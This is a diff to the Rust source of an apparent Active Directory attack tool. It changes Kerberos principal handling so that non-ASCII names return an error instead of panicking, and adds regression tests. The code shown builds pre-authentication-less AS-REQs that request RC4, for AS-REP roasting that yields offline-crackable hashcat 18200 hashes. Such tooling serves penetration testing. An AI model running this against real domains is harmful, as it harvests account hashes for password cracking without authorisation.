@@ -83,24 +83,36 @@ pub fn candidates(snap: &Snapshot, realm: &str) -> (Vec<Candidate>, Vec<Candidat
 // AS-REQ construction (pre-auth-less, RC4-first for a hashcat-18200 hash).
 // ---------------------------------------------------------------------------
 
-pub(crate) fn krb_string(s: &str) -> GeneralStringAsn1 {
-    GeneralStringAsn1::from(Ia5String::from_string(s.to_owned()).unwrap())
+/// Wrap a caller-supplied string as an IA5 (ASCII 0..=127) Kerberos component.
+///
+/// RFC 4120 mandates Kerberos principal / realm components be IA5. A non-ASCII
+/// input from the CLI (`--user александр`, `--realm корп.локал`) used to panic
+/// via unchecked `Ia5String::from_string(...).unwrap()`; now returns a clean
+/// `anyhow::Error` that surfaces at the CLI boundary with an actionable message.
+pub(crate) fn krb_string(s: &str) -> Result<GeneralStringAsn1> {
+    let ia5 = Ia5String::from_string(s.to_owned()).map_err(|_| {
+        anyhow!(
+            "Kerberos principal component {s:?} contains non-IA5 (non-ASCII) characters; \
+             RFC 4120 requires 7-bit ASCII for user / realm / SPN components"
+        )
+    })?;
+    Ok(GeneralStringAsn1::from(ia5))
 }
 
-pub(crate) fn principal(name_type: u8, parts: &[&str]) -> PrincipalName {
+pub(crate) fn principal(name_type: u8, parts: &[&str]) -> Result<PrincipalName> {
     let strings = parts
         .iter()
-        .map(|p| GeneralStringAsn1::from(Ia5String::from_string((*p).to_owned()).unwrap()))
-        .collect::<Vec<_>>();
-    PrincipalName {
+        .map(|p| krb_string(p))
+        .collect::<Result<Vec<_>>>()?;
+    Ok(PrincipalName {
         name_type: ExplicitContextTag0::from(IntegerAsn1(vec![name_type])),
         name_string: ExplicitContextTag1::from(Asn1SequenceOf::from(strings)),
-    }
+    })
 }
 
 /// Build an AS-REQ for `user@realm` with no PA-ENC-TIMESTAMP, requesting RC4 so the
 /// returned AS-REP enc-part is an offline-crackable hashcat 18200 hash.
-fn build_as_req(user: &str, realm: &str) -> AsReq {
+fn build_as_req(user: &str, realm: &str) -> Result<AsReq> {
     let mut nonce = [0u8; 4];
     rand::RngCore::fill_bytes(&mut rand::thread_rng(), &mut nonce);
     nonce[0] &= 0x7f; // keep the ASN.1 INTEGER positive
@@ -113,14 +125,12 @@ fn build_as_req(user: &str, realm: &str) -> AsReq {
         cname: Optional::from(Some(ExplicitContextTag1::from(principal(
             NT_PRINCIPAL,
             &[user],
-        )))),
-        realm: ExplicitContextTag2::from(GeneralStringAsn1::from(
-            Ia5String::from_string(realm.to_owned()).unwrap(),
-        )),
+        )?))),
+        realm: ExplicitContextTag2::from(krb_string(realm)?),
         sname: Optional::from(Some(ExplicitContextTag3::from(principal(
             NT_SRV_INST,
             &["krbtgt", realm],
-        )))),
+        )?))),
         from: Optional::from(None),
         till: ExplicitContextTag5::from(KerberosTime::from(
             Date::new(2037, 9, 13, 2, 48, 5).unwrap(),
@@ -139,12 +149,12 @@ fn build_as_req(user: &str, realm: &str) -> AsReq {
         additional_tickets: Optional::from(None),
     };
 
-    AsReq::from(KdcReq {
+    Ok(AsReq::from(KdcReq {
         pvno: ExplicitContextTag1::from(IntegerAsn1(vec![5])),
         msg_type: ExplicitContextTag2::from(IntegerAsn1(vec![AS_REQ_MSG_TYPE])),
         padata: Optional::from(None),
         req_body: ExplicitContextTag4::from(body),
-    })
+    }))
 }
 
 // ---------------------------------------------------------------------------
@@ -220,7 +230,7 @@ pub(crate) async fn kdc_exchange(kdc: &str, request: &[u8]) -> Result<Vec<u8>> {
 /// Perform an AS-REP roast against one candidate; returns the hashcat 18200 line.
 /// No credentials required — relies on the account's DONT_REQ_PREAUTH flag.
 pub async fn asrep_roast(c: &Candidate, kdc: &str) -> Result<String> {
-    let raw = picky_asn1_der::to_vec(&build_as_req(&c.sam, &c.realm))
+    let raw = picky_asn1_der::to_vec(&build_as_req(&c.sam, &c.realm)?)
         .map_err(|e| anyhow!("encode AS-REQ: {e}"))?;
     let resp = kdc_exchange(kdc, &raw).await?;
 
@@ -315,7 +325,27 @@ mod tests {
     /// message construction without needing a live KDC.
     #[test]
     fn as_req_roundtrips() {
-        let req = build_as_req("myuser", "EXAMPLE.COM");
+        let req = build_as_req("myuser", "EXAMPLE.COM").expect("ASCII-only build_as_req");
+        let _ = req;
+    }
+
+    #[test]
+    fn non_ascii_principal_rejected_cleanly() {
+        // Regression: `Ia5String::from_string("александр".into()).unwrap()` used to panic,
+        // taking down the whole tool on any international AD (Cyrillic / Chinese / Turkish).
+        // Now returns a diagnostic Error with the offending value + RFC citation.
+        let err = build_as_req("александр", "EXAMPLE.COM").unwrap_err();
+        let msg = format!("{err}");
+        assert!(msg.contains("non-IA5"), "unexpected err: {msg}");
+        assert!(msg.contains("RFC 4120"), "err lacks spec citation: {msg}");
+
+        let err2 = build_as_req("admin", "КОРП.ЛОКАЛ").unwrap_err();
+        assert!(format!("{err2}").contains("non-IA5"));
+    }
+
+    #[test]
+    fn _asreq_placeholder() {
+        let req = build_as_req("myuser2", "EXAMPLE.COM").expect("ASCII-only build_as_req");
         let raw = picky_asn1_der::to_vec(&req).expect("encode");
         let decoded: AsReq = picky_asn1_der::from_bytes(&raw).expect("decode");
         assert_eq!(picky_asn1_der::to_vec(&decoded).unwrap(), raw);
